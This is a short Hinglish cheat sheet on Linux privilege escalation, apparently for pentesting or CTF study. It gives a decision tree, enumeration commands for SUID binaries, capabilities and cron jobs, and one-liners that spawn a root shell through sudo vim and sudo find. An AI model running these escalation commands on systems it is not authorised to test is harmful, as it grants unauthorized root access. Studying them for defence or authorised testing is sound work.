1) Linux Privilege Escalation — decision tree

Sabse pehle kya socho

  • Current user kaun hai? Kis group me hai?
  • Interactive shell hai ya limited command exec?
  • Kya sudo mila? Kya SUID मिला? Kya writeable script/service मिली?
  • Kya secrets ya configs se lateral credential mil sakta hai?
  • Kya root shell hi target hai ya sensitive-read bhi enough hai?
Priority order: sudo -l → SUID → capabilities → cron/systemd → secrets → containers → kernel last.

Fast triage commands

id
whoami
hostname
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
crontab -l
ls -la /etc/cron* /var/spool/cron
ps aux
ss -tulpn
find / -writable -type d 2>/dev/null | head

3) Advanced Linux reasoning patterns

sudo analysis

  • Binary kya interpreter/editor/pager/archive tool hai?
  • Kya arguments restricted hain?
  • Kya environment preserve hota hai?
  • Kya writable file se command chain ban sakti hai?
sudo -l
sudo /usr/bin/vim -c ':set shell=/bin/sh|shell'
sudo find . -exec /bin/sh \; -quit

SUID analysis

  • Standard package binary ya custom enterprise helper?
  • strings, file, ldd se context lo
  • Temp path, relative path, unsafe copy/write, tar/zip style flows dhundo
find / -perm -4000 -type f 2>/dev/null
ls -la /path/to/suid
file /path/to/suid
strings /path/to/suid | head -40

Capabilities analysis

getcap -r / 2>/dev/null
/usr/bin/python3 cap_setuid+ep
/usr/bin/tar cap_dac_read_search+ep

Capabilities ka matlab hota hai binary bina full root bane bhi dangerous kaam kar sakti hai.

Cron / service analysis

ls -la /etc/cron.daily /etc/cron.hourly
systemctl list-timers --all
systemctl status some.service
cat /etc/systemd/system/some.service

Writable script, relative path, PATH poisoning, wildcard injection, backup jobs — sab common patterns hain.
